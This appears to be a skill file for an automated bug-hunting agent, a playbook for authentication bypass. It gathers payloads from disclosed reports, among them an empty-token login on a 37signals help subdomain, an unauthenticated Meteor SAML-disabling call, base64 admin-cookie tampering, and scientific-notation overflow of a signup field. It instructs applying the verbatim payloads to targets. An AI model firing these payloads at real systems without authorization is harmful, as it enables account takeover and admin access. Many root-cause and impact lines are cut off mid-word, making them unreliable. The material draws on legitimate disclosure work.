---
name: hunter-l4-authentication-bypass
description: "Find authentication bypasses with real techniques."
domain: cybersecurity
subdomain: web
tags:
- web
- authentication-bypass
- hunting
- l4
version: '1.0'
---
# L4 Playbook: Authentication Bypass (hunter)

**L3 technique sheet:** `knowledge/sheets/authentication-bypass.md` — (pending L3 synthesis)

## When to use
Attack a target surface for Authentication Bypass. Load the L3 sheet for full sub-pattern detail; use the real exemplars below as concrete tests.

## Real validated patterns (from disclosed reports)

### 1024880 [ajaysenr]
- endpoint: `POST /session (help-basecamphq.37signals.com)`
- parameter: `username, password, authenticity_token, product, account_id`
- payload: `utf8=%E2%9C%93&authenticity_token=&product=bcx&account_id=2479412&username=VALIDCREDENTIALS&password=VALIDCREDENTIALS&commit=Log+in`
- root cause: An expired/insecure 37signals subdomain (help-basecamphq.37signals.com) serves the same login flow but lacks the anti-automation checks and proper coo
- impact: Login on the expired subdomain succeeded with an empty authenticity_token and without security cookies (identity_id, device_id, session_token, _launch

### 1049375 [ajaysenr]
- endpoint: `Meteor.call addSamlService (unauthenticated RPC)`
- parameter: `name`
- payload: `Meteor.call("addSamlService", "Default_cert")`
- root cause: The unauthenticated Meteor method addSamlProvider lets clients toggle off the SAML certificate setting, and signature verification is skipped when no 
- impact: Unauthenticated attacker disabled SAML signature verification and logged in as an arbitrary user with administrative privileges using a faked SAML res

### 1065731 [ajaysenr]
- endpoint: `POST /secure-login`
- parameter: `username,password,cookie`
- payload: `eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==`
- root cause: Session cookie is base64-encoded with no signature/integrity check, so the admin flag can be flipped client-side; credentials are also weak (access:co
- impact: Logged in as access:computer, tampered cookie admin:true, downloaded password-protected my_secure_files_not_for_you.zip, cracked its password (hahahah

### 1065885 [ajaysenr]
- endpoint: `POST /secure-login`
- parameter: `username,password,cookie`
- payload: `{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}`
- root cause: Session cookie is base64-encoded with no signature/integrity check, so the admin flag can be flipped client-side; credentials are also weak (access:co
- impact: Logged in as access:computer, tampered cookie admin:true, downloaded password-protected my_secure_files_not_for_you.zip, cracked its password (hahahah

### 1067443 [ajaysenr]
- endpoint: `POST /secure-login`
- parameter: `cookie`
- payload: `eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=`
- root cause: The securelogin cookie was only base64-encoded (not signed/encrypted), so flipping the admin attribute from false to true was trivially accepted by th
- impact: With the admin=true cookie, downloaded the admin-only password-protected zip and retrieved flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004} after cracking t

### 1067443 [ajaysenr]
- endpoint: `POST /signup-manager/`
- parameter: `age, lastname`
- payload: `action=signup&username=random&password=random&age=2E3&firstname=random&lastname=randomlastnameY`
- root cause: is_numeric() accepted scientific notation ('2E3') and intval() expanded it to 2000, overflowing the fixed-width age padding and shifting the admin fla
- impact: Created an admin account (last line character Y) and logged in to retrieve the flag and the next challenge link.

### 1067835 [ajaysenr]
- endpoint: `POST /secure-login`
- parameter: `cookie`
- payload: `eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=`
- root cause: The securelogin cookie was only base64-encoded (not signed/encrypted), so flipping the admin attribute from false to true was trivially accepted by th
- impact: With the admin=true cookie, downloaded the admin-only password-protected zip and retrieved flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004} after cracking t

### 1067835 [ajaysenr]
- endpoint: `POST /signup-manager/`
- parameter: `age, lastname`
- payload: `action=signup&username=random&password=random&age=1e3&firstname=random&lastname=randomlastnameY`
- root cause: is_numeric() accepted scientific notation ('1e3') and intval() expanded it to 1000, overflowing the fixed-width age padding and shifting the admin fla
- impact: Created an admin account (last line character Y) and logged in to retrieve the flag.

## Approach
1. Map endpoints that take identifiers/input (see L3 sheet for shapes).
2. Apply the verbatim payloads above; vary encoding/params.
3. Prove impact with a request+response+impact (evidence gate).

